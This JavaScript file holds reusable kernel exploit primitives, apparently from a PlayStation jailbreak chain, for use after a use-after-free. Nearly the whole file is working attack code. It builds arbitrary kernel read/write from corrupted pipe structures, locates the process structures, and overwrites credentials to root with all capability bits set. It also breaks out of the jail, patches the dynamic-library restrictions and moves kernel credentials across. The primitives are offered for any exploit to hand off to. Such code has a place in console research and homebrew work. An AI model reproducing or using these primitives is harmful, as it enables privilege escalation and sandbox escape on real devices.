/*
 * primitives.js — Reusable kernel exploit primitives extracted from p2jb.js
 *
 * These functions implement the POST-UAF stages of the exploit:
 *   - Pipe-based kernel read/write
 *   - Process credential manipulation (jailbreak)
 *   - Kernel data resolution
 *   - Debug menu enablement (GPU DMA)
 *
 * These are INDEPENDENT of how the initial UAF is obtained.
 * Any fast exploit that achieves overlapping kernel allocations
 * can hand off to these primitives.
 *
 * DEPENDENCY: Requires Y2JB framework (syscall, malloc, read/write helpers)
 */

// ============================================================
// PRIMITIVE 1: Pipe-based fast kernel read/write
// ============================================================
// Once you have:
//   - master_pipe_data (kaddr of master pipe's buffer struct)
//   - victim_pipe_data (kaddr of victim pipe's buffer struct)
// You can corrupt master's buffer pointer to point at victim's pipe_data,
// giving arbitrary kernel read/write through normal pipe read/write syscalls.
//
// Setup sequence (from p2jb stage3):
//   1. kwrite_slow(master_pipe_data, overwrite_buf, 24)
//      - Sets master pipe's buffer to point at victim_pipe_data
//   2. Now writing to master_wfd overwrites victim's pipe struct
//   3. Set victim's buffer pointer to any kernel address
//   4. Read/write victim pipe = read/write that kernel address
//
// Result functions:
//   kread(user_buf, kaddr, size)  — read kernel memory to userspace
//   kwrite(kaddr, user_buf, size) — write userspace data to kernel memory
//   kread32(kaddr) → BigInt
//   kread64(kaddr) → BigInt
//   kwrite32(kaddr, value)
//   kwrite64(kaddr, value)

function build_pipe_krw(S) {
    const PAGE_SIZE = 0x4000;
    const pipe_cmd = malloc(24);

    const set_victim_pipe = (cnt, inp, out, size, buf_addr) => {
        write32(pipe_cmd, BigInt(cnt));
        write32(pipe_cmd + 4n, BigInt(inp));
        write32(pipe_cmd + 8n, BigInt(out));
        write32(pipe_cmd + 12n, BigInt(size));
        write64(pipe_cmd + 16n, buf_addr);
        syscall(SYSCALL.write, BigInt(S.master_wfd), pipe_cmd, 24n);
        syscall(SYSCALL.read, BigInt(S.master_rfd), pipe_cmd, 24n);
    };

    S.kread = (buf_addr, kaddr, size) => {
        set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr);
        return syscall(SYSCALL.read, BigInt(S.victim_rfd), buf_addr, BigInt(size));
    };

    S.kwrite = (kaddr, buf_addr, size) => {
        set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr);
        return syscall(SYSCALL.write, BigInt(S.victim_wfd), buf_addr, BigInt(size));
    };

    const scratch = malloc(64);
    S.kread32 = (k) => { S.kread(scratch, k, 4); return read32(scratch); };
    S.kread64 = (k) => { S.kread(scratch, k, 8); return read64(scratch); };
    S.kwrite32 = (k, v) => { write32(scratch, BigInt(v)); S.kwrite(k, scratch, 4); };
    S.kwrite64 = (k, v) => { write64(scratch, BigInt(v)); S.kwrite(k, scratch, 8); };
}

// ============================================================
// PRIMITIVE 2: Find current process in kernel
// ============================================================
// Uses the SIGIO trick: set FIOASYNC on a pipe, which stores
// a pointer to our proc struct in the pipe's sigio field.
//
// Returns: curproc kernel address

function find_curproc(S, OFF) {
    const [sr, sw] = create_pipe();
    const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
    const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
    const pid_buf = malloc(4);
    write32(pid_buf, our_pid);
    syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);

    const sigio_fp = S.kread64(S.fd_ofiles + BigInt(sigio_rfd) * OFF.FILEDESCENT_SIZE);
    const sigio_pipe = S.kread64(sigio_fp);
    const pipe_sigio = S.kread64(sigio_pipe + OFF.PIPE_SIGIO);
    const curproc = S.kread64(pipe_sigio);

    // Verify PID matches
    if (S.kread32(curproc + OFF.PROC_PID) !== our_pid) {
        throw new Error("curproc PID mismatch");
    }

    syscall(SYSCALL.close, BigInt(sigio_rfd));
    syscall(SYSCALL.close, BigInt(sigio_wfd));

    S.curproc = curproc;
    S.proc_ucred = S.kread64(curproc + OFF.PROC_UCRED);
    S.proc_fd = S.kread64(curproc + OFF.PROC_FD);
    return curproc;
}

// ============================================================
// PRIMITIVE 3: Find rootvnode (for unjailing)
// ============================================================
// Walks the proc list to find pid=0 (kernel process),
// then reads its current directory vnode = rootvnode.

function find_rootvnode(S, OFF) {
    let p = S.curproc, kernel_proc = null;
    for (let i = 0; i < 1000; i++) {
        if (p === 0n || (p >> 48n) !== 0xFFFFn) break;
        if (S.kread32(p + OFF.PROC_PID) === 0n) { kernel_proc = p; break; }
        p = S.kread64(p + 0n); // next proc in allproc list
    }
    if (!kernel_proc) throw new Error("kernel proc (pid=0) not found");

    const kernel_fd = S.kread64(kernel_proc + OFF.PROC_FD);
    S.rootvnode = S.kread64(kernel_fd + OFF.FD_CDIR);
    return S.rootvnode;
}

// ============================================================
// PRIMITIVE 4: Jailbreak — escalate privileges
// ============================================================

function jailbreak(S, OFF) {
    const B = S.proc_ucred;

    // Root credentials
    S.kwrite32(B + OFF.UCRED_CR_UID, 0);
    S.kwrite32(B + OFF.UCRED_CR_RUID, 0);
    S.kwrite32(B + OFF.UCRED_CR_SVUID, 0);
    S.kwrite32(B + OFF.UCRED_CR_NGROUPS, 1);
    S.kwrite32(B + OFF.UCRED_CR_RGID, 0);
    S.kwrite32(B + OFF.UCRED_CR_SVGID, 0);

    // Sony auth + capabilities
    S.kwrite64(B + OFF.UCRED_CR_SCEAUTHID, 0x4800000000010003n);
    S.kwrite64(B + OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
    S.kwrite64(B + OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);

    // Attributes
    let attrs = S.kread64(B + 0x80n);
    attrs = (attrs & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
    S.kwrite64(B + 0x80n, attrs);

    // Unjail: set root/jail vnode to real rootvnode
    S.kwrite64(S.proc_fd + OFF.FD_RDIR, S.rootvnode);
    S.kwrite64(S.proc_fd + OFF.FD_JDIR, S.rootvnode);

    // Verify
    if (S.kread32(B + OFF.UCRED_CR_UID) !== 0n) {
        throw new Error("jailbreak verify failed");
    }
}

// ============================================================
// PRIMITIVE 5: Resolve kernel data_base
// ============================================================

function resolve_data_base(S, OFF) {
    const KDATA_MASK = 0xffff804000000000n;
    let p = S.curproc;
    for (let i = 0; i < 64; i++) {
        if (p !== 0n && (p & KDATA_MASK) === KDATA_MASK &&
            ((p - OFF.DATA_BASE_ALLPROC) & 0xfffn) === 0n) {
            S.data_base = p - OFF.DATA_BASE_ALLPROC;
            return S.data_base;
        }
        p = S.kread64(p + 8n);
    }
    return null; // data_base not found (jailbreak still works without it)
}

// ============================================================
// PRIMITIVE 6: Patch dynlib restrictions
// ============================================================

function patch_dynlib(S, OFF) {
    const is_kptr = (v) => (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;
    const p_dynlib = S.kread64(S.curproc + 0x3E8n);
    if (!is_kptr(p_dynlib)) throw new Error("p_dynlib not a kptr");

    S.kwrite32(p_dynlib + 0x118n, 0);
    S.kwrite64(p_dynlib + 0x18n, 1n);
    S.kwrite64(p_dynlib + 0xF0n, 0n);
    S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);

    const dynlib_eboot = S.kread64(p_dynlib + 0x00n);
    if (!is_kptr(dynlib_eboot)) throw new Error("dynlib_eboot not a kptr");

    const eboot_segments = S.kread64(dynlib_eboot + 0x40n);
    if (!is_kptr(eboot_segments)) throw new Error("eboot_segments not a kptr");

    S.kwrite64(eboot_segments + 0x08n, 0n);
    S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
}

// ============================================================
// PRIMITIVE 7: Post-jailbreak stability (credential migration)
// ============================================================

function post_jb_stabilize(S, OFF) {
    const B = S.proc_ucred;
    if (B === 0n || (B >> 48n) !== 0xFFFFn) return;

    // Migrate file descriptor credentials
    const nfiles = Number(S.kread32(S.fd_ofiles - OFF.FDESCENTTBL_HDR) & 0xFFFFFFFFn);
    let fd_migrated = 0;
    if (nfiles > 0 && nfiles <= 0x10000) {
        for (let i = 0; i < nfiles; i++) {
            const fp = S.kread64(S.fd_ofiles + BigInt(i) * OFF.FILEDESCENT_SIZE);
            if (fp === 0n || (fp >> 48n) !== 0xFFFFn) continue;
            const fcred = S.kread64(fp + 0x10n);
            if (fcred === B || (fcred >> 48n) !== 0xFFFFn) continue;
            S.kwrite64(fp + 0x10n, B);
            fd_migrated++;
        }
    }

    // Migrate thread credentials
    let td_migrated = 0;
    const main_thread = S.kread64(S.curproc + 0x10n);
    if (main_thread !== 0n && (main_thread >> 48n) === 0xFFFFn) {
        let td = main_thread, walked = 0;
        while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
            walked++;
            if (S.kread64(td + 0x08n) !== S.curproc) break;
            const tu = S.kread64(td + 0x140n);
            if (tu !== B && (tu >> 48n) === 0xFFFFn) {
                S.kwrite64(td + 0x140n, B);
                td_migrated++;
            }
            td = S.kread64(td + 0x10n);
        }
    }

    // Bump refcount
    const total = fd_migrated + td_migrated;
    if (total > 0) {
        const rc = Number(S.kread32(B) & 0xFFFFFFFFn);
        S.kwrite32(B, rc + total);
    }
}
